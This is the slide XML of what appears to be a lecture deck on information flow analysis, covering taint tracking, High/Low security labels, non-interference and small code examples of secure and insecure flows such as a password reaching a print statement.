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80" r:id="rId2"/>
    <p:sldId id="709" r:id="rId3"/>
    <p:sldId id="711" r:id="rId4"/>
    <p:sldId id="713" r:id="rId5"/>
    <p:sldId id="714" r:id="rId6"/>
    <p:sldId id="726" r:id="rId7"/>
    <p:sldId id="720" r:id="rId8"/>
    <p:sldId id="717" r:id="rId9"/>
    <p:sldId id="715" r:id="rId10"/>
    <p:sldId id="716" r:id="rId11"/>
    <p:sldId id="712" r:id="rId12"/>
    <p:sldId id="718" r:id="rId13"/>
    <p:sldId id="719" r:id="rId14"/>
    <p:sldId id="722" r:id="rId15"/>
    <p:sldId id="723" r:id="rId16"/>
    <p:sldId id="725" r:id="rId17"/>
    <p:sldId id="728" r:id="rId18"/>
    <p:sldId id="724" r:id="rId19"/>
    <p:sldId id="727" r:id="rId20"/>
    <p:sldId id="372" r:id="rId21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709"/>
            <p14:sldId id="711"/>
            <p14:sldId id="713"/>
            <p14:sldId id="714"/>
            <p14:sldId id="726"/>
            <p14:sldId id="720"/>
            <p14:sldId id="717"/>
            <p14:sldId id="715"/>
            <p14:sldId id="716"/>
            <p14:sldId id="712"/>
            <p14:sldId id="718"/>
            <p14:sldId id="719"/>
            <p14:sldId id="722"/>
            <p14:sldId id="723"/>
            <p14:sldId id="725"/>
            <p14:sldId id="728"/>
            <p14:sldId id="724"/>
            <p14:sldId id="727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5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   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Information Flow Analysis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5" y="1284843"/>
            <a:ext cx="4879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Development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1E2CA3-2BDC-D44A-B454-28E298DE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75F45-9421-5640-AA7C-61C224B30C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14"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5955447" y="1051851"/>
            <a:ext cx="3167038" cy="29137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2DEFF2-F8D8-4445-AFFA-6092F24CC00B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812896" y="3412116"/>
            <a:ext cx="3435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(Un)wanted information flows?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80128F-DFEF-9B42-95F9-354C9617E528}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812896" y="1196928"/>
            <a:ext cx="40943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Locate nearest hotel using google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43AFB8-F930-6A4F-A54E-D24A6EE4F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447" y="4071119"/>
            <a:ext cx="3167038" cy="217967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F6DD5DD-967F-7F46-A9D0-B6623DC154FF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812896" y="1723108"/>
            <a:ext cx="40639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Book a room with your credit card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5AFC09-B0C7-2A41-953E-4CE6D72D4CFC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="828126" y="2274387"/>
            <a:ext cx="25202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Sensitive information?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EAF1E4-EB81-D743-9CEF-870B27C329F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812896" y="2838259"/>
            <a:ext cx="4395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location information &amp; credit card no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004EA4-EC2B-B443-AD3E-0AC19120EC58}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="828126" y="4011022"/>
            <a:ext cx="4772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location should be leaked to google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A7F642-4DC6-B64D-816D-5F9BD6293E87}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812896" y="4584330"/>
            <a:ext cx="53254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credit card info should be leaked to hotel only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700B14-240C-2643-A7A6-3CD4396220AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="383591" y="5433378"/>
            <a:ext cx="57548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Such information flow policies are an interesting class of security policies</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="291566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6DB52-DB0C-3446-BBC1-3025C8EF4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ADA6CB-29F8-A343-B719-A18A87818264}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1383680" y="154466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Can OS access control on the app prevent these flows?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9107B0-66DD-A84D-8E91-32168D40033D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1882468" y="2316434"/>
            <a:ext cx="72077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NO!</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Access control can give or deny an app access to some information or service, but cannot restrict what the app does with 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6FE555-6344-9E4F-B7D9-9A01F8C57EA7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1383679" y="3874727"/>
            <a:ext cx="63403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More generally, could we enforce this at runtime by monitoring the inputs &amp; outputs of the application?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0F9559-A129-6B44-A8EB-80772D00C443}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1882467" y="4923496"/>
            <a:ext cx="68742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NO! </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Unless track the information inside the app with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dynamic taint tracking.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971C93-2422-3049-8919-FF4541B9ED04}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="206906" y="434340"/>
            <a:ext cx="4405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Information Flow Analysis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3456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E432A2-6704-2245-9817-E4A2CBEC2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439575-23D9-3B4B-924A-777810CD6767}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1186318" y="1251983"/>
            <a:ext cx="69679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An interesting category of security requirements is about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information flow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>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B1E366-6A8B-654F-ADDA-1B76996A6D92}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2456667" y="2109659"/>
            <a:ext cx="56976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- No confidential information should leak over network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A58EA7-652A-914A-BCC5-3DC70D31CFE1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2456667" y="2869512"/>
            <a:ext cx="62785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- No untrusted input from network should leak into database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D96CBF-9F2E-F844-8AE5-C477ED1F4908}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2456667" y="5273332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- Is sensitive data </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0"/>
              <a:t>protected</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> throughout the program?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B741E3-2AC2-884F-BE8B-DFB113952D10}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2456667" y="3994668"/>
            <a:ext cx="3047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- Who can </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0"/>
              <a:t>access</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> the data?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8BDF39-62D9-1F46-9B74-4C462A095408}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2456667" y="4651978"/>
            <a:ext cx="3171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- Where does the data </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0"/>
              <a:t>flow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1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F4C12E-D16C-4E4E-8953-C3411446DF68}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="206906" y="434340"/>
            <a:ext cx="4405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Information Flow Analysis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4683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9D7A5D-FF4F-FD48-BD92-AB45521D2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B50D25-8971-9A46-B9EE-FC88DED6B45A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2469027" y="3160765"/>
            <a:ext cx="4953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Public variables </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>= labeled "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Low</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>"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7B01E6-064F-9F48-9672-BB873DB1E602}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="893027" y="1364076"/>
            <a:ext cx="73796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IFA tracks variables and operations in a program using labels or policies. Usually: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549362-0383-E340-B003-F0676BDE3B49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2469027" y="2400920"/>
            <a:ext cx="4219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Sensitive variables </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>= labeled "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>High</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>"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65EE73-0EB3-7849-9E8A-9BB123A54F84}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="893027" y="3860213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IFA enforces</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>No flow from High → Low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2D8EA4-0218-1A45-B476-7C9F39F0C48F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="761071" y="4948501"/>
            <a:ext cx="80037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This rule is often called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Non-Interference: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>high-level actions should not affect low-level observations.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D23C4B-DB00-2046-85CC-C19A73E7A607}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="206906" y="434340"/>
            <a:ext cx="4405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Information Flow Analysis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5220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AD4B7D-39AC-A74E-9371-8ABF0CC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0D5F5-38EB-A74F-B121-156B149DA7E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1093746" y="1570577"/>
            <a:ext cx="80394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Ensures that confidential information cannot influence the behavior or outputs of a system that is accessible to less privileged users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D3049-95A7-9B40-BF13-76F15EA284DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1093747" y="2752559"/>
            <a:ext cx="91798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 non-interference, an action taken by a high-level user (e.g., a user with access to sensitive data) should not affect the behavior or observable outputs available to a low-level user (e.g., a user with access to public or non-sensitive data).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7DF17F-6FC5-A748-A797-9091089B3C60}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2431894" y="4995819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"low-level" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>user who only sees public information.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1E6863-9F1F-234E-87C9-A46972834E52}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2431894" y="399238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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"high-level" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>user who has access to secret data.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78437C-2A90-E749-B70A-7E69F816F7D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="329912" y="459221"/>
            <a:ext cx="30396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Non-Interference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1993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434275-0818-744B-933F-E0A202AB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26E0FBC-3235-9C43-8C15-C82E0FD1A79B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="315676" y="1235646"/>
            <a:ext cx="748474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marR="5080" indent="-338455">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="105"/>
              </a:spcBef>
              <a:buFont typeface="Comic Sans MS"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="350520" algn="l"/>
              </a:tabLst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114" dirty="0">
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>consider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75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114" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3333CC"/>
                </a:solidFill>
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>lattice</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" spc="-4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000" spc="95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110" dirty="0">
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>different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110" dirty="0">
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>security </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" spc="75" dirty="0">
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>levels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78DE66D-2EF1-EA49-B6AE-610368D0048A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="406481" y="1898650"/>
            <a:ext cx="39084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5"/>
              </a:spcBef>
              <a:buFont typeface="Comic Sans MS"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="350520" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" spc="9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100" dirty="0">
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>simplicity,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105" dirty="0">
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>just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135" dirty="0">
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>two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75" dirty="0">
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>levels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023414F-D192-EB47-81F4-820D9D1E1397}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="863681" y="2205583"/>
            <a:ext cx="1061720" cy="7600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590"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="009900"/>
              </a:buClr>
              <a:buFont typeface="Comic Sans MS"/>
              <a:buChar char="–"/>
              <a:tabLst>
                <a:tab pos="294005" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" spc="65" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3333CC"/>
                </a:solidFill>
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>H(igh)</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:latin typeface="Arial MT"/>
              <a:cs typeface="Arial MT"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="294005" indent="-281305">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="490"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="009900"/>
              </a:buClr>
              <a:buFont typeface="Comic Sans MS"/>
              <a:buChar char="–"/>
              <a:tabLst>
                <a:tab pos="294005" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" spc="80" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3333CC"/>
                </a:solidFill>
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>L(ow)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91FDA2A4-86A7-B147-80C9-A0C0CCF2D834}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2092356" y="2205583"/>
            <a:ext cx="2742565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20500"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="100"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" spc="150" dirty="0">
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>or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100" dirty="0">
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>confidential,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114" dirty="0">
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>secret </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" spc="150" dirty="0">
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>or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105" dirty="0">
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>public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49D5001D-E414-1742-8CA1-9655FEA72656}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6999254" y="1778634"/>
            <a:ext cx="2952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30" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3333CC"/>
                </a:solidFill>
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>H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DEF2CFDC-4EC6-1646-8E8B-474CBFA59D03}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7054754" y="3450158"/>
            <a:ext cx="2406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75" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3333CC"/>
                </a:solidFill>
                <a:latin typeface="Arial MT"/>
                <a:cs typeface="Arial MT"/>
              </a:rPr>
              <a:t>L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692661F2-7ACD-504D-94D2-3F9AA835CCAF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7155718" y="2393441"/>
            <a:ext cx="1905" cy="721360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="1904" h="721360">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1524" y="720851"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:ln w="28956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E397AB81-6F4E-1649-A37A-9BB65169741B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7755413" y="6124576"/>
            <a:ext cx="302259" cy="23177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25"/>
              </a:spcBef>
            </a:pPr>
            <a:fld id="{81D60167-4931-47E6-BA6A-407CBD079E47}" type="slidenum">
              <a:rPr lang="en-US" spc="25" smtClean="0"/>
              <a:pPr marL="38100">
                <a:spcBef>
                  <a:spcPts val="25"/>
                </a:spcBef>
              </a:pPr>
              <a:t>7</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" spc="25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E13947-3B85-C846-916C-51594C55128B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="206906" y="434340"/>
            <a:ext cx="4405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Information Flow Analysis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9057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DDA834-1044-FA47-9CD8-ABC6E5EF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3BDC4A-F979-844E-82EF-7DF99316185B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1753193" y="1437836"/>
            <a:ext cx="328968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h = r e a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>d_p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n ( ) ;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>l = h ;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Oval Callout 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8709F353-FEA4-7E4B-89C1-E5051D00C480}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1437836"/>
            <a:ext cx="1650380" cy="954107"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeEllipseCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -181644"/>
              <a:gd name="adj2" fmla="val 64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Secure?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0CCE5B-6272-EE44-A472-F730465D9E1D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1753193" y="3422753"/>
            <a:ext cx="330891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h = r e a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>d_p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n ( ) ; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>l = h ∗ 2 ;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Oval Callout 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7D4BEDB-6024-9B4C-A570-DDE953CC815F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7374558" y="3575749"/>
            <a:ext cx="1650380" cy="954107"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeEllipseCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -181644"/>
              <a:gd name="adj2" fmla="val 64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Secure?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CBF8DC-8BC9-D146-9593-7D6613FE2FE9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="206906" y="434340"/>
            <a:ext cx="4405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Information Flow Analysis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2962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EF3D00-984F-4346-9D49-B5EA860C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D7ADB4-3CE9-9B46-A8CA-DC6CA68A2389}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1829729" y="1865146"/>
            <a:ext cx="51663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password = input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("Enter password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>: ") display = "Welcome!"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print(display)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05A15E-41CF-B648-B8A5-78458C54960B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1936419" y="3948643"/>
            <a:ext cx="72885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Here, there no problem. The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> never reaches any public output (print), so the information flow is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0"/>
              <a:t>safe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1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1F82DA-C598-D042-B4F0-B7E782D68A46}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="206906" y="434340"/>
            <a:ext cx="4405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Information Flow Analysis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7707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5C64E6-1A78-BE4B-AEBB-8F290F8E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FB1B6-FE54-3C46-B2B3-81216836CDDE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1673613" y="1624504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password = input("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Enter password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: ")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>display = password</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>print(display)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EBF144-CB90-2548-8A27-1C7F607C60F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1673612" y="3720933"/>
            <a:ext cx="69797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Now, the password (sensitive) flows into display, and then into print (public).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6C7214-5C74-AA43-A6A5-2A8F937EEA09}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="206906" y="434340"/>
            <a:ext cx="4405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Information Flow Analysis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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F1FE1-46F8-7A4E-BBF6-1F15F990138E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
